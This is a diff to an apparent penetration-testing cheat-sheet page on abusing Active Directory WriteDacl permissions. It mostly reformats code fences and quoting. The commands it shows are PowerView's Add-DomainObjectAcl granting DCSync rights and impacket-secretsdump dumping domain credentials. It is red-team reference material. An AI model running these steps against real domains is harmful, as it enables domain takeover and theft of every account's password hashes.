@@ -4,7 +4,6 @@ date: 2024-7-12
 tags: ["WriteDacl", "active driectory", "ad", "Windows", "dcsync", "secretsdump"]
 ---
 
----
 ### Abuse #1: Add dcsync right to user
 
 {{< tab set1 tab1 active >}}Windows{{< /tab >}}
@@ -14,7 +13,7 @@ tags: ["WriteDacl", "active driectory", "ad", "Windows", "dcsync", "secretsdump"
 
 <div>
 
-```powershell
+```console
 . .\PowerView.ps1
 ```
 
@@ -24,15 +23,15 @@ tags: ["WriteDacl", "active driectory", "ad", "Windows", "dcsync", "secretsdump"
 
 <div>
 
-```powershell
-$username = "<DOMAIN>\<USER>"
+```console
+$username = '<DOMAIN>\<USER>'
 ```
 
-```powershell
-$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
+```console
+$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 ```
 
-```powershell
+```console
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
@@ -42,7 +41,7 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 
 <div>
 
-```powershell
+```console
 Add-DomainObjectAcl -PrincipalIdentity <USER> -TargetIdentity '<DOMAIN>\<TARGET_GROUP>' -Rights DCSync -Credential $cred
 ```
 
@@ -57,8 +56,8 @@ Add-DomainObjectAcl -PrincipalIdentity <USER> -TargetIdentity '<DOMAIN>\<TARGET_
 
 <div>
 
-```bash
-impacket-secretsdump <USER>:<PASSWORD>@<TARGET>
+```console
+impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>'
 ```
 
 </div>
